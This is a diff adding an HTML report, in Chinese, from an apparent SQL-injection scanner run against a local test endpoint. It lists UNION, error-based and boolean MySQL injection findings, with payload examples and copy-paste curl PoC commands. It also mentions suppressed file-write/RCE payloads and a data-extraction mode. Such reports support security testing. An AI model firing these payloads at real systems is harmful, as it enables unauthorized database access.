@@ -1,0 +1,88 @@
+<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">
+      <title>SQL 注入检测报告 JEik7P99jFjR</title>
+      <style>
+        body{font-family:system-ui,'Microsoft YaHei',sans-serif;margin:24px;color:#222}
+        h1{font-size:20px}h2{font-size:16px;margin-top:24px}
+        table{border-collapse:collapse;width:100%;margin-top:8px}
+        th,td{border:1px solid #ccc;padding:6px 8px;font-size:13px;text-align:left}
+        th{background:#f5f5f5}.critical{color:#c62828;font-weight:bold}
+        .high{color:#ef6c00}.medium{color:#f9a825}.low{color:#9e9e9e}
+        .meta{color:#666;font-size:13px}pre{background:#f7f7f7;padding:10px;border-radius:6px;white-space:pre-wrap;word-break:break-all}
+        .footer{margin-top:32px;padding-top:12px;border-top:1px solid #eee;color:#999;font-size:12px;text-align:center}
+        .poc{border:1px solid #e3e3e3;border-radius:6px;padding:4px 12px 10px;margin:12px 0}
+        .verdict{border-left:4px solid #f9a825;background:#fffbe6;padding:6px 14px 10px;margin:12px 0;border-radius:4px}
+        .verdict.bad{border-left-color:#c62828;background:#fff3f2}
+        .verdict h2{margin:8px 0 4px;font-size:15px}
+        .verdict ul{margin:4px 0 4px 18px;padding:0;font-size:13px;color:#5a4a00}
+        .poc h3{font-size:14px;margin:10px 0 4px}details{margin:6px 0}summary{cursor:pointer;font-size:13px;color:#555}
+        pre.curl{background:#0f1115;color:#d7e0ea;border-radius:6px;padding:10px;white-space:pre-wrap;word-break:break-all}
+      </style></head><body>
+      <h1>SQL 注入检测报告</h1>
+      <p class="meta">扫描ID：JEik7P99jFjR · 风险等级：<b>Critical</b> · 数据库：MySQL</p>
+      <p class="meta">目标：<code>http://127.0.0.1:8181/num?id=1</code> · 注入点：1 · 漏洞：3</p>
+      <div class="verdict">
+      <h2>本次命中与抑制项</h2>
+      <p class="meta">本次已检出 3 条漏洞；verdict 仅描述「未检出」类阴性结论的可信度，不适用于本次结果。</p>
+      <p>本次扫描检出 3 条漏洞；verdict 仅描述「未检出」类阴性结论的可信度，命中详情见 vulns</p>
+      <p class="meta">本次被抑制的能力（不代表已测试）：</p><ul><li>高危 payload 池（写文件/RCE/重运算类，本配置下候选 1 条）已抑制：productionMode=true 且未 confirmDestructive=true。确需在已授权目标上投放时显式设 confirmDestructive=true；靶场/演练环境可整体关护栏（productionMode=false）</li><li>本次开启拖库（enableExtract）：提取阶段会向目标发出大量读请求（受限速与行数上限约束）。生产环境建议控制行数并避开业务高峰</li></ul>
+    </div>
+      <h2>漏洞清单</h2>
+      <table><thead><tr><th>注入点</th><th>技术</th><th>数据库</th><th>风险</th><th>说明</th></tr></thead>
+      <tbody><tr>
+        <td>283e732d</td>
+        <td>union</td>
+        <td>MySQL</td>
+        <td class="high">High</td>
+        <td>UNION 注入成功，回显列：0,1,2,3,4（列数 5）</td>
+      </tr><tr>
+        <td>283e732d</td>
+        <td>error</td>
+        <td>MySQL</td>
+        <td class="high">High</td>
+        <td>数据库报错回显：SQL syntax（识别为 MySQL）</td>
+      </tr><tr>
+        <td>283e732d</td>
+        <td>boolean</td>
+        <td>MySQL</td>
+        <td class="medium">Medium</td>
+        <td>布尔注入确认(统计·自适应): 真≈基线1.00、假≠基线1.00、差异1.00、基线噪声0.00、门槛0.66、z=2.83(显著)</td>
+      </tr></tbody></table>
+      <h2>Payload 示例</h2>
+      <pre>• 1 UNION SELECT &#39;SQLISCANNER0&#39;,&#39;SQLISCANNER1&#39;,&#39;SQLISCANNER2&#39;,&#39;SQLISCANNER3&#39;,&#39;SQLISCANNER4&#39;-- -
+• 1 ORDER BY 5-- -
+• 1&#39; AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
+• 1 AND 1=1
+• 1 AND 1=2</pre>
+      <h2>复现方式（PoC）</h2>
+      <div class="poc">
+        <h3>PoC-1 · 注入点 283e732d · union</h3>
+        <p class="meta">请求：<code>GET</code> <code>http://127.0.0.1:8181/num?id=1+UNION+SELECT+%27SQLISCANNER0%27%2C%27SQLISCANNER1%27%2C%27SQLISCANNER2%27%2C%27SQLISCANNER3%27%2C%27SQLISCANNER4%27--+-</code></p>
+        <p class="meta">Payload：<code>1 UNION SELECT &#39;SQLISCANNER0&#39;,&#39;SQLISCANNER1&#39;,&#39;SQLISCANNER2&#39;,&#39;SQLISCANNER3&#39;,&#39;SQLISCANNER4&#39;-- -</code></p>
+        <p class="meta">由引擎 buildInjectionRequest 还原，与扫描时实际请求同构 · 生成于 2026-09-11T18:28:39.397Z</p>
+        <p class="meta">curl（复制即跑）</p><pre class="curl">curl -i -s -k &#39;http://127.0.0.1:8181/num?id=1+UNION+SELECT+%27SQLISCANNER0%27%2C%27SQLISCANNER1%27%2C%27SQLISCANNER2%27%2C%27SQLISCANNER3%27%2C%27SQLISCANNER4%27--+-&#39;</pre><details><summary>原始 HTTP 报文（存为 poc-1-283e732d.txt 后用 -r 导入复现）</summary><pre>GET /num?id=1+UNION+SELECT+%27SQLISCANNER0%27%2C%27SQLISCANNER1%27%2C%27SQLISCANNER2%27%2C%27SQLISCANNER3%27%2C%27SQLISCANNER4%27--+- HTTP/1.1
+Host: 127.0.0.1:8181
+
+</pre></details>
+      </div>
+<div class="poc">
+        <h3>PoC-2 · 注入点 283e732d · error</h3>
+        <p class="meta">请求：<code>GET</code> <code>http://127.0.0.1:8181/num?id=1%27+AND+extractvalue%281%2Cconcat%280x7e%2C%28SELECT+version%28%29%29%29%29--+-</code></p>
+        <p class="meta">Payload：<code>1&#39; AND extractvalue(1,concat(0x7e,(SELECT version())))-- -</code></p>
+        <p class="meta">由引擎 buildInjectionRequest 还原，与扫描时实际请求同构 · 生成于 2026-09-11T18:28:39.397Z</p>
+        <p class="meta">curl（复制即跑）</p><pre class="curl">curl -i -s -k &#39;http://127.0.0.1:8181/num?id=1%27+AND+extractvalue%281%2Cconcat%280x7e%2C%28SELECT+version%28%29%29%29%29--+-&#39;</pre><details><summary>原始 HTTP 报文（存为 poc-2-283e732d.txt 后用 -r 导入复现）</summary><pre>GET /num?id=1%27+AND+extractvalue%281%2Cconcat%280x7e%2C%28SELECT+version%28%29%29%29%29--+- HTTP/1.1
+Host: 127.0.0.1:8181
+
+</pre></details>
+      </div>
+<div class="poc">
+        <h3>PoC-3 · 注入点 283e732d · boolean</h3>
+        <p class="meta">请求：<code>GET</code> <code>http://127.0.0.1:8181/num?id=1+AND+1%3D1</code></p>
+        <p class="meta">Payload：<code>1 AND 1=1</code></p>
+        <p class="meta">由引擎 buildInjectionRequest 还原，与扫描时实际请求同构 · 生成于 2026-09-11T18:28:39.397Z</p>
+        <p class="meta">curl（复制即跑）</p><pre class="curl">curl -i -s -k &#39;http://127.0.0.1:8181/num?id=1+AND+1%3D1&#39;</pre><details><summary>原始 HTTP 报文（存为 poc-3-283e732d.txt 后用 -r 导入复现）</summary><pre>GET /num?id=1+AND+1%3D1 HTTP/1.1
+Host: 127.0.0.1:8181
+
+</pre></details>
+      </div>
+      <footer class="footer">本报告仅供授权安全测试使用。未获授权对任何系统进行扫描、测试或数据提取均可能违反法律法规，请勿用于非法用途。</footer>
+      </body></html>
